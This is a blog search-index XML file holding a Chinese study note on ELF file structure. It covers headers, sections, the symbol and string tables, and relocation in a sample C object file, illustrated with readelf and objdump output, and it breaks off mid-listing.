<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ELF初探</title>
    <url>/2024/08/15/ELF%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h1 id="程序示例"><a href="#程序示例" class="headerlink" title="程序示例"></a>程序示例</h1><blockquote>
<p>参照多方资料做个总结,用下方程序</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">gcc -c 文件名.c，生成可重定位文件，生成的为可重定位文件，不要直接生成可执行文件</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* format, ...)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> global_init_var = <span class="number">84</span>;</span><br><span class="line"><span class="type">int</span> global_uninit_var;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func1</span><span class="params">(<span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> static_var = <span class="number">85</span>;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> static_var2;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">    func1(static_var + static_var2 + a + b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="elf-header"><a href="#elf-header" class="headerlink" title="elf header"></a>elf header</h1><blockquote>
<p>初次学习主要关注 Start of section headers即可，初次旨在弄清楚文件结构</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">其中指出了节表的开始地址，也指出了节表中元素数量</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">root@L:/home/l/c++<span class="meta"># readelf -h ./elfdemo.o</span></span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   <span class="number">7f</span> <span class="number">45</span> <span class="number">4</span>c <span class="number">46</span> <span class="number">02</span> <span class="number">01</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">  Class:                             ELF64</span><br><span class="line">  Data:                              <span class="number">2&#x27;</span>s complement, little endian</span><br><span class="line">  Version:                           <span class="number">1</span> (current)</span><br><span class="line">  OS/ABI:                            UNIX - System V</span><br><span class="line">  ABI Version:                       <span class="number">0</span></span><br><span class="line">  Type:                              REL (Relocatable file)</span><br><span class="line">  Machine:                           Advanced Micro Devices X86<span class="number">-64</span></span><br><span class="line">  Version:                           <span class="number">0x1</span></span><br><span class="line">  Entry point address:               <span class="number">0x0</span></span><br><span class="line">  Start of program headers:          <span class="number">0</span> (bytes into file)</span><br><span class="line">  Start of section headers:          <span class="number">1040</span> (bytes into file)</span><br><span class="line">  Flags:                             <span class="number">0x0</span></span><br><span class="line">  Size of this header:               <span class="number">64</span> (bytes)</span><br><span class="line">  Size of program headers:           <span class="number">0</span> (bytes)</span><br><span class="line">  Number of program headers:         <span class="number">0</span></span><br><span class="line">  Size of section headers:           <span class="number">64</span> (bytes)</span><br><span class="line">  Number of section headers:         <span class="number">14</span></span><br><span class="line">  Section header <span class="built_in">string</span> table index: <span class="number">13</span><span class="comment">/*字符串表的节索引*/</span></span><br></pre></td></tr></table></figure>

<h1 id="section-header（节描述符）"><a href="#section-header（节描述符）" class="headerlink" title="section header（节描述符）"></a>section header（节描述符）</h1><blockquote>
<p>按照本人的理解为section和segment的区别是一个是在文件中，一个是在runtime，本次学习所用实例为可重定向文件，非文件，因此没有program header。</p>
<p>其详细的描述了每一个节的信息。</p>
</blockquote>
<h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word	sh_name;		<span class="comment">/* Section name (string tbl index) */</span></span><br><span class="line">  Elf64_Word	sh_type;		<span class="comment">/* Section type */</span><span class="comment">/*段的类型（用处）*/</span></span><br><span class="line">  Elf64_Xword	sh_flags;		<span class="comment">/* Section flags */</span><span class="comment">/*标志位*/</span></span><br><span class="line">  Elf64_Addr	sh_addr;		<span class="comment">/* Section virtual addr at execution */</span></span><br><span class="line">  Elf64_Off	sh_offset;		<span class="comment">/* Section file offset */</span><span class="comment">/*文件偏移地址*/</span></span><br><span class="line">  Elf64_Xword	sh_size;		<span class="comment">/* Section size in bytes */</span><span class="comment">/*节长*/</span></span><br><span class="line">  Elf64_Word	sh_link;		<span class="comment">/* Link to another section */</span></span><br><span class="line">  Elf64_Word	sh_info;		<span class="comment">/* Additional section information */</span></span><br><span class="line">  Elf64_Xword	sh_addralign;		<span class="comment">/* Section alignment */</span><span class="comment">/*对齐，若为8，则起始地址除8=0*/</span></span><br><span class="line">  Elf64_Xword	sh_entsize;		<span class="comment">/* Entry size if section holds table */</span><span class="comment">/*项长度，符号表24*/</span></span><br><span class="line">&#125; Elf64_Shdr;</span><br><span class="line"></span><br><span class="line">root@L:/home/l/c++<span class="meta"># readelf -S ./elfdemo.o</span></span><br><span class="line">There are <span class="number">14</span> section headers, starting at offset <span class="number">0x410</span>:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  [ <span class="number">0</span>]                   <span class="literal">NULL</span>             <span class="number">0000000000000000</span>  <span class="number">00000000</span></span><br><span class="line">       <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>           <span class="number">0</span>     <span class="number">0</span>     <span class="number">0</span></span><br><span class="line">  [ <span class="number">1</span>] .text             PROGBITS         <span class="number">0000000000000000</span>  <span class="number">00000040</span></span><br><span class="line">       <span class="number">0000000000000062</span>  <span class="number">0000000000000000</span>  AX       <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [ <span class="number">2</span>] .rela.text        RELA             <span class="number">0000000000000000</span>  <span class="number">000002f</span>0</span><br><span class="line">       <span class="number">0000000000000078</span>  <span class="number">0000000000000018</span>   I      <span class="number">11</span>     <span class="number">1</span>     <span class="number">8</span></span><br><span class="line">  [ <span class="number">3</span>] .data             PROGBITS         <span class="number">0000000000000000</span>  <span class="number">000000</span>a4</span><br><span class="line">       <span class="number">0000000000000008</span>  <span class="number">0000000000000000</span>  WA       <span class="number">0</span>     <span class="number">0</span>     <span class="number">4</span></span><br><span class="line">  [ <span class="number">4</span>] .bss              NOBITS           <span class="number">0000000000000000</span>  <span class="number">000000</span>ac</span><br><span class="line">       <span class="number">0000000000000008</span>  <span class="number">0000000000000000</span>  WA       <span class="number">0</span>     <span class="number">0</span>     <span class="number">4</span></span><br><span class="line">  [ <span class="number">5</span>] .rodata           PROGBITS         <span class="number">0000000000000000</span>  <span class="number">000000</span>ac</span><br><span class="line">       <span class="number">0000000000000004</span>  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [ <span class="number">6</span>] .comment          PROGBITS         <span class="number">0000000000000000</span>  <span class="number">000000b</span>0</span><br><span class="line">       <span class="number">000000000000002</span>c  <span class="number">0000000000000001</span>  MS       <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [ <span class="number">7</span>] .note.GNU-<span class="built_in">stack</span>   PROGBITS         <span class="number">0000000000000000</span>  <span class="number">000000</span>dc</span><br><span class="line">       <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>           <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [ <span class="number">8</span>] .note.gnu.pr[...] NOTE             <span class="number">0000000000000000</span>  <span class="number">000000e0</span></span><br><span class="line">       <span class="number">0000000000000020</span>  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [ <span class="number">9</span>] .eh_frame         PROGBITS         <span class="number">0000000000000000</span>  <span class="number">00000100</span></span><br><span class="line">       <span class="number">0000000000000058</span>  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [<span class="number">10</span>] .rela.eh_frame    RELA             <span class="number">0000000000000000</span>  <span class="number">00000368</span></span><br><span class="line">       <span class="number">0000000000000030</span>  <span class="number">0000000000000018</span>   I      <span class="number">11</span>     <span class="number">9</span>     <span class="number">8</span></span><br><span class="line">  [<span class="number">11</span>] .symtab           SYMTAB           <span class="number">0000000000000000</span>  <span class="number">00000158</span></span><br><span class="line">       <span class="number">0000000000000138</span>  <span class="number">0000000000000018</span>          <span class="number">12</span>     <span class="number">8</span>     <span class="number">8</span></span><br><span class="line">  [<span class="number">12</span>] .strtab           STRTAB           <span class="number">0000000000000000</span>  <span class="number">00000290</span></span><br><span class="line">       <span class="number">000000000000005</span>a  <span class="number">0000000000000000</span>           <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [<span class="number">13</span>] .shstrtab         STRTAB           <span class="number">0000000000000000</span>  <span class="number">00000398</span></span><br><span class="line">       <span class="number">0000000000000074</span>  <span class="number">0000000000000000</span>           <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  D (mbind), l (large), p (processor specific)</span><br></pre></td></tr></table></figure>

<h2 id="Symbol-table（重要节之一）"><a href="#Symbol-table（重要节之一）" class="headerlink" title="Symbol table（重要节之一）"></a>Symbol table（重要节之一）</h2><h3 id="其中元素结构为："><a href="#其中元素结构为：" class="headerlink" title="其中元素结构为："></a>其中元素结构为：</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1.Symbol name,为符号名所在位置的index，而符号名在字符串表中，会在下面介绍</span></span><br><span class="line"><span class="comment">2.st_info：符号类型和绑定，</span></span><br><span class="line"><span class="comment">	符号绑定（binding）：表示符号的作用域和链接属性，例如是局部符号还是全局符号，还有弱符号。</span></span><br><span class="line"><span class="comment">	符号类型（type）：表示符号的类型，例如它是一个函数、变量还是某种特殊的符号。</span></span><br><span class="line"><span class="comment">3.st_other，符号可见性，可由符号绑定决定，也可以自定义，决定了是否能被外部引用。	</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint32_t</span> Elf64_Word;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint16_t</span> Elf64_Section;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint64_t</span> Elf64_Addr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint64_t</span> Elf64_Xword;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;		<span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf64_Section	st_shndx;		<span class="comment">/* Section index */</span></span><br><span class="line">  Elf64_Addr	st_value;		<span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf64_Xword	st_size;		<span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br><span class="line">一个结构体占：<span class="number">4</span>+<span class="number">2</span>+<span class="number">1</span>+<span class="number">1</span>+<span class="number">8</span>+<span class="number">8</span>=<span class="number">24b</span>ytes</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="String-table-Shstrtab"><a href="#String-table-Shstrtab" class="headerlink" title="String table &amp;&amp; Shstrtab"></a>String table &amp;&amp; Shstrtab</h2><blockquote>
<p>分别用来保存符号表的名称和节表的名称，即symbol name和section name。可通过st_name和sh_name索引来访问。</p>
</blockquote>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">符号表</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">root@L:/home/l/c++<span class="meta"># readelf -s elfdemo.o</span></span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.symtab&#x27;</span> contains <span class="number">13</span> entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     <span class="number">1</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS elfdemo.c</span><br><span class="line">     <span class="number">2</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">1</span> .text</span><br><span class="line">     <span class="number">3</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">3</span> .data</span><br><span class="line">     <span class="number">4</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">4</span> .bss</span><br><span class="line">     <span class="number">5</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">5</span> .rodata</span><br><span class="line">     <span class="number">6</span>: <span class="number">0000000000000004</span>     <span class="number">4</span> OBJECT  LOCAL  DEFAULT    <span class="number">3</span> static_var<span class="number">.1</span></span><br><span class="line">     <span class="number">7</span>: <span class="number">0000000000000004</span>     <span class="number">4</span> OBJECT  LOCAL  DEFAULT    <span class="number">4</span> static_var2<span class="number">.0</span></span><br><span class="line">     <span class="number">8</span>: <span class="number">0000000000000000</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT    <span class="number">3</span> global_init_var</span><br><span class="line">     <span class="number">9</span>: <span class="number">0000000000000000</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT    <span class="number">4</span> global_uninit_var</span><br><span class="line">    <span class="number">10</span>: <span class="number">0000000000000000</span>    <span class="number">43</span> FUNC    GLOBAL DEFAULT    <span class="number">1</span> func1</span><br><span class="line">    <span class="number">11</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT  UND <span class="built_in">printf</span></span><br><span class="line">    <span class="number">12</span>: <span class="number">000000000000002b</span>    <span class="number">55</span> FUNC    GLOBAL DEFAULT    <span class="number">1</span> main</span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> 符号表的hex表示，可以理解其存储的格式</span></span><br><span class="line"><span class="comment"> 第一列为索引，注意大端法，一个结构体占24字节，仔细阅读可以理解其与字符串表的对应关系。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">root@L:/home/l/c++<span class="meta"># readelf -x 11 ./elfdemo.o</span></span><br><span class="line"></span><br><span class="line">Hex dump of section <span class="string">&#x27;.symtab&#x27;</span>:</span><br><span class="line">  <span class="number">0x00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> ................</span><br><span class="line">  <span class="number">0x00000010</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">01000000</span> <span class="number">0400f</span>1ff ................</span><br><span class="line">  <span class="number">0x00000020</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> ................</span><br><span class="line">  <span class="number">0x00000030</span> <span class="number">00000000</span> <span class="number">03000100</span> <span class="number">00000000</span> <span class="number">00000000</span> ................</span><br><span class="line">  <span class="number">0x00000040</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">03000300</span> ................</span><br><span class="line">  <span class="number">0x00000050</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> ................</span><br><span class="line">  <span class="number">0x00000060</span> <span class="number">00000000</span> <span class="number">03000400</span> <span class="number">00000000</span> <span class="number">00000000</span> ................</span><br><span class="line">  <span class="number">0x00000070</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">03000500</span> ................</span><br><span class="line">  <span class="number">0x00000080</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> ................</span><br><span class="line">  <span class="number">0x00000090</span> <span class="number">0b000000</span> <span class="number">01000300</span> <span class="number">04000000</span> <span class="number">00000000</span> ................</span><br><span class="line">  <span class="number">0x000000a0</span> <span class="number">04000000</span> <span class="number">00000000</span> <span class="number">18000000</span> <span class="number">01000400</span> ................</span><br><span class="line">  <span class="number">0x000000b0</span> <span class="number">04000000</span> <span class="number">00000000</span> <span class="number">04000000</span> <span class="number">00000000</span> ................</span><br><span class="line">  <span class="number">0x000000c0</span> <span class="number">26000000</span> <span class="number">11000300</span> <span class="number">00000000</span> <span class="number">00000000</span> &amp;...............</span><br><span class="line">  <span class="number">0x000000d0</span> <span class="number">04000000</span> <span class="number">00000000</span> <span class="number">36000000</span> <span class="number">11000400</span> .......<span class="number">.6</span>.......</span><br><span class="line">  <span class="number">0x000000e0</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">04000000</span> <span class="number">00000000</span> ................</span><br><span class="line">  <span class="number">0x000000f0</span> <span class="number">48000000</span> <span class="number">12000100</span> <span class="number">00000000</span> <span class="number">00000000</span> H...............</span><br><span class="line">  <span class="number">0x00000100</span> <span class="number">2b</span>000000 <span class="number">00000000</span> <span class="number">4e000000</span> <span class="number">10000000</span> +.......N.......</span><br><span class="line">  <span class="number">0x00000110</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> ................</span><br><span class="line">  <span class="number">0x00000120</span> <span class="number">55000000</span> <span class="number">12000100</span> <span class="number">2b</span>000000 <span class="number">00000000</span> U.......+.......</span><br><span class="line">  <span class="number">0x00000130</span> <span class="number">37000000</span> <span class="number">00000000</span>                   <span class="number">7.</span>......</span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> 字符串表</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">root@L:/home/l/c++<span class="meta"># readelf -x 12 ./elfdemo.o</span></span><br><span class="line"></span><br><span class="line">Hex dump of section <span class="string">&#x27;.strtab&#x27;</span>:</span><br><span class="line">  <span class="number">0x00000000</span> <span class="number">00656</span>c66 <span class="number">64656</span>d6f <span class="number">2e630073</span> <span class="number">74617469</span> .elfdemo.c.stati</span><br><span class="line">  <span class="number">0x00000010</span> <span class="number">635f</span>7661 <span class="number">722e3100</span> <span class="number">73746174</span> <span class="number">69635f</span>76 c_var<span class="number">.1</span>.static_v</span><br><span class="line">  <span class="number">0x00000020</span> <span class="number">6172322</span>e <span class="number">3000676</span>c <span class="number">6f</span>62616c <span class="number">5f</span>696e69 ar2<span class="number">.0</span>.global_ini</span><br><span class="line">  <span class="number">0x00000030</span> <span class="number">745f</span>7661 <span class="number">7200676</span>c <span class="number">6f</span>62616c <span class="number">5f</span>756e69 t_var.global_uni</span><br><span class="line">  <span class="number">0x00000040</span> <span class="number">6e69745</span>f <span class="number">76617200</span> <span class="number">66756e63</span> <span class="number">31007072</span> nit_var.func1.pr</span><br><span class="line">  <span class="number">0x00000050</span> <span class="number">696e7466</span> <span class="number">006</span>d6169 <span class="number">6e00</span>              intf.main.</span><br><span class="line"></span><br><span class="line">root@L:/home/l/c++<span class="meta"># readelf -x 13 ./elfdemo.o</span></span><br><span class="line"></span><br><span class="line">Hex dump of section <span class="string">&#x27;.shstrtab&#x27;</span>:</span><br><span class="line">  <span class="number">0x00000000</span> <span class="number">002e7379</span> <span class="number">6</span>d746162 <span class="number">002e7374</span> <span class="number">72746162</span> ..symtab..strtab</span><br><span class="line">  <span class="number">0x00000010</span> <span class="number">002e7368</span> <span class="number">73747274</span> <span class="number">6162002</span>e <span class="number">72656</span>c61 ..shstrtab..rela</span><br><span class="line">  <span class="number">0x00000020</span> <span class="number">2e746578</span> <span class="number">74002e64</span> <span class="number">61746100</span> <span class="number">2e627373</span> .text..data..bss</span><br><span class="line">  <span class="number">0x00000030</span> <span class="number">002e726</span>f <span class="number">64617461</span> <span class="number">002e636</span>f <span class="number">6</span>d6d656e ..rodata..commen</span><br><span class="line">  <span class="number">0x00000040</span> <span class="number">74002e6</span>e <span class="number">6f</span>74652e <span class="number">474e552</span>d <span class="number">73746163</span> t..note.GNU-stac</span><br><span class="line">  <span class="number">0x00000050</span> <span class="number">6b</span>002e6e <span class="number">6f</span>74652e <span class="number">676e752</span>e <span class="number">70726f</span>70 k..note.gnu.prop</span><br><span class="line">  <span class="number">0x00000060</span> <span class="number">65727479</span> <span class="number">002e7265</span> <span class="number">6</span>c612e65 <span class="number">685f</span>6672 erty..rela.eh_fr</span><br><span class="line">  <span class="number">0x00000070</span> <span class="number">616</span>d6500                            ame.        </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="关于重定位节"><a href="#关于重定位节" class="headerlink" title="关于重定位节"></a>关于重定位节</h2><blockquote>
<p>因此是一个可重定位文件缺少外部文件函数的定义，因此需要链接器来重定位，而.rela就是需要重定位的节</p>
</blockquote>
<p>此时可以反汇编文件，文件是这样的：仔细观察可以看见call字段地址为00 00 00 00，故需要重定位。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">root@L:/home/l/c++<span class="meta"># objdump -d elfdemo.o</span></span><br><span class="line"></span><br><span class="line">elfdemo.o:     file format elf64-x86<span class="number">-64</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line"><span class="number">0000000000000000</span> &lt;func1&gt;:</span><br><span class="line">   <span class="number">0</span>:   f3 <span class="number">0f</span> <span class="number">1</span>e fa             endbr64 </span><br><span class="line">   <span class="number">4</span>:   <span class="number">55</span>                      push   %rbp</span><br><span class="line">   <span class="number">5</span>:   <span class="number">48</span> <span class="number">89</span> e5                mov    %rsp,%rbp</span><br><span class="line">   <span class="number">8</span>:   <span class="number">48</span> <span class="number">83</span> ec <span class="number">10</span>             sub    $<span class="number">0x10</span>,%rsp</span><br><span class="line">   c:   <span class="number">89</span> <span class="number">7</span>d fc                mov    %edi,<span class="number">-0x4</span>(%rbp)</span><br><span class="line">   f:   <span class="number">8b</span> <span class="number">45</span> fc                mov    <span class="number">-0x4</span>(%rbp),%eax</span><br><span class="line">  <span class="number">12</span>:   <span class="number">89</span> c6                   mov    %eax,%esi</span><br><span class="line">  <span class="number">14</span>:   <span class="number">48</span> <span class="number">8</span>d <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    lea    <span class="number">0x0</span>(%rip),%rax        # <span class="number">1b</span> &lt;func1+<span class="number">0x1b</span>&gt;</span><br><span class="line">  <span class="number">1b</span>:   <span class="number">48</span> <span class="number">89</span> c7                mov    %rax,%rdi</span><br><span class="line">  <span class="number">1</span>e:   b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov    $<span class="number">0x0</span>,%eax</span><br><span class="line">  <span class="number">23</span>:   e8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          call   <span class="number">28</span> &lt;func1+<span class="number">0x28</span>&gt;</span><br><span class="line">  <span class="number">28</span>:   <span class="number">90</span>                      nop</span><br><span class="line">  <span class="number">29</span>:   c9                      leave  </span><br><span class="line">  <span class="number">2</span>a:   c3                      ret    </span><br><span class="line"></span><br><span class="line"><span class="number">000000000000002b</span> &lt;main&gt;:</span><br><span class="line">  <span class="number">2b</span>:   f3 <span class="number">0f</span> <span class="number">1</span>e fa             endbr64 </span><br><span class="line">  <span class="number">2f</span>:   <span class="number">55</span>                      push   %rbp</span><br><span class="line">  <span class="number">30</span>:   <span class="number">48</span> <span class="number">89</span> e5                mov    %rsp,%rbp</span><br><span class="line">  <span class="number">33</span>:   <span class="number">48</span> <span class="number">83</span> ec <span class="number">10</span>             sub    $<span class="number">0x10</span>,%rsp</span><br><span class="line">  <span class="number">37</span>:   c7 <span class="number">45</span> f8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   $<span class="number">0x1</span>,<span class="number">-0x8</span>(%rbp)</span><br><span class="line">  <span class="number">3</span>e:   <span class="number">8b</span> <span class="number">15</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov    <span class="number">0x0</span>(%rip),%edx        # <span class="number">44</span> &lt;main+<span class="number">0x19</span>&gt;</span><br><span class="line">  <span class="number">44</span>:   <span class="number">8b</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov    <span class="number">0x0</span>(%rip),%eax        # <span class="number">4</span>a &lt;main+<span class="number">0x1f</span>&gt;</span><br><span class="line">  <span class="number">4</span>a:   <span class="number">01</span> c2                   add    %eax,%edx</span><br><span class="line">  <span class="number">4</span>c:   <span class="number">8b</span> <span class="number">45</span> f8                mov    <span class="number">-0x8</span>(%rbp),%eax</span><br><span class="line">  <span class="number">4f</span>:   <span class="number">01</span> c2                   add    %eax,%edx</span><br><span class="line">  <span class="number">51</span>:   <span class="number">8b</span> <span class="number">45</span> fc                mov    <span class="number">-0x4</span>(%rbp),%eax</span><br><span class="line">  <span class="number">54</span>:   <span class="number">01</span> d0                   add    %edx,%eax</span><br><span class="line">  <span class="number">56</span>:   <span class="number">89</span> c7                   mov    %eax,%edi</span><br><span class="line">  <span class="number">58</span>:   e8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          call   <span class="number">5</span>d &lt;main+<span class="number">0x32</span>&gt;</span><br><span class="line">  <span class="number">5</span>d:   <span class="number">8b</span> <span class="number">45</span> f8                mov    <span class="number">-0x8</span>(%rbp),%eax</span><br><span class="line">  <span class="number">60</span>:   c9                      leave  </span><br><span class="line">  <span class="number">61</span>:   c3                      ret    </span><br></pre></td></tr></table></figure>

<p>可以观察到重定位之后符号表的变化，主要是变化为装载地址的相对地址：</p>
<blockquote>
<p>可以通过gdb来验证</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Symbol table <span class="string">&#x27;.symtab&#x27;</span> contains <span class="number">41</span> entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     <span class="number">1</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS Scrt1.o</span><br><span class="line">     <span class="number">2</span>: <span class="number">000000000000038</span>c    <span class="number">32</span> OBJECT  LOCAL  DEFAULT    <span class="number">4</span> __abi_tag</span><br><span class="line">     <span class="number">3</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS crtstuff.c</span><br><span class="line">     <span class="number">4</span>: <span class="number">0000000000001090</span>     <span class="number">0</span> FUNC    LOCAL  DEFAULT   <span class="number">16</span> deregister_tm_clones</span><br><span class="line">     <span class="number">5</span>: <span class="number">00000000000010</span>c0     <span class="number">0</span> FUNC    LOCAL  DEFAULT   <span class="number">16</span> register_tm_clones</span><br><span class="line">     <span class="number">6</span>: <span class="number">0000000000001100</span>     <span class="number">0</span> FUNC    LOCAL  DEFAULT   <span class="number">16</span> __do_global_dtors_aux</span><br><span class="line">     <span class="number">7</span>: <span class="number">0000000000004018</span>     <span class="number">1</span> OBJECT  LOCAL  DEFAULT   <span class="number">26</span> completed<span class="number">.0</span></span><br><span class="line">     <span class="number">8</span>: <span class="number">0000000000003</span>dc0     <span class="number">0</span> OBJECT  LOCAL  DEFAULT   <span class="number">22</span> __do_global_dtor[...]</span><br><span class="line">     <span class="number">9</span>: <span class="number">0000000000001140</span>     <span class="number">0</span> FUNC    LOCAL  DEFAULT   <span class="number">16</span> frame_dummy</span><br><span class="line">    <span class="number">10</span>: <span class="number">0000000000003</span>db8     <span class="number">0</span> OBJECT  LOCAL  DEFAULT   <span class="number">21</span> __frame_dummy_in[...]</span><br><span class="line">    <span class="number">11</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS elfdemo.c</span><br><span class="line">    <span class="number">12</span>: <span class="number">0000000000004014</span>     <span class="number">4</span> OBJECT  LOCAL  DEFAULT   <span class="number">25</span> static_var<span class="number">.1</span></span><br><span class="line">    <span class="number">13</span>: <span class="number">0000000000004020</span>     <span class="number">4</span> OBJECT  LOCAL  DEFAULT   <span class="number">26</span> static_var2<span class="number">.0</span></span><br><span class="line">    <span class="number">14</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> 